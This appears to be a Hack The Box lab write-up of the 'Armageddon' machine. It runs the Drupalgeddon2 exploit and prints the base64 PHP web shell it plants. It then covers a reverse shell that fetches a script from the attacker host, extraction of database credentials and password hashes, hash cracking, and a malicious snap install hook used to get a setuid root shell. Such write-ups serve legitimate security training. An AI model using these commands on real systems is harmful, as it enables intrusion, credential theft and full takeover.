---
title: "Armageddon from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Armageddon from HTB
`nmap` scan shows this
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
```
Site runs on `Drupal 7`
use this script
```bash
searchsploit -m php/webapps/44449.rb

ruby drupalgeddon2.rb -h
<internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:86:in `require': cannot load such file -- highline/import (LoadError)
	from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:86:in `require'
	from drupalgeddon2.rb:16:in `<main>'
```
This gave error so we have to install `highline`for ruby
```bash
sudo gem install highline
Fetching highline-3.1.1.gem
Successfully installed highline-3.1.1
Parsing documentation for highline-3.1.1
Installing ri documentation for highline-3.1.1
Done installing documentation for highline after 4 seconds
1 gem installed
```
then run the script
```ruby
ruby drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo DOKXJFEJ
[+] Result : DOKXJFEJ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>>
```
to get proper `reverse shell`you will need
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.233 - - [01/Sep/2024 21:57:06] "GET /reverse.sh HTTP/1.1" 200 -

 rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.233] 34088
bash: no job control in this shell
bash-4.2$
```
in `/var/www/html/sites/default/settings.php`we find this:
```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
Let's check out `mysql` databases
```bash
bash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
sers;'-u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from u
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
```
Found this now crack the password
```bash
hashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
[+] Drupal > v7.x

hashcat --help | grep Drupal
   7900 | Drupal7

hashcat hash /usr/share/wordlists/rockyou.txt -m 7900
```
>Username
>   brucetherealadmin
> Password
>    booboo

Now connect to `ssh`
```bash
ssh brucetherealadmin@10.10.10.233
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin)
```
***
User Flag is: d37fd1ab216523d7803ec1665f41b272
***
to do privilege escalation we use this `https://gtfobins.github.io/gtfobins/snap/`
```bash
$ sudo gem install --no-document fpm


$ COMMAND=id
 cd $(mktemp -d)
 mkdir -p meta/hooks
 printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
 chmod +x meta/hooks/install
 fpm -n xxxx -s dir -t snap -a all meta
 Created package {:path=>"xxxx_1.0_all.snap"}
```
then transfer that to `machine`
```bash
sudo snap install test.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)
```
We have `root ID`so now lets change it a bit
```bash
COMMAND="chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
transfer it and execute the same way
```bash
$ sudo snap install privilege.snap --dangerous --devmode

$ ls -la
-rwsr-xr-x. 1 root              root              964536 Sep  2 09:51 bash

$ ./bash -p
bash-4.2# id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) groups=1000(brucetherealadmin)
```
***
Root Flag is: 694195fd5d417ef2f7903ae2bd65f044
***
![screen](/assets/images/2024-09-02_12-58-46.png)
